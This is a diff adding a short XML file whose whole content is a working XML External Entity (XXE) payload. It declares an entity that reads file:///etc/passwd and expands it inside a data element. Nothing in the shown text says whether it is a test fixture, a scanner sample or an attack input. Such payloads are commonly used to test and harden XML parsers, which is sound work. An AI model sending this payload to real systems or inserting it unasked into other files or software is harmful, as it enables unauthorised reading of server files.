@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ELEMENT root ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<root>
+  <data>&xxe;</data>
+</root>
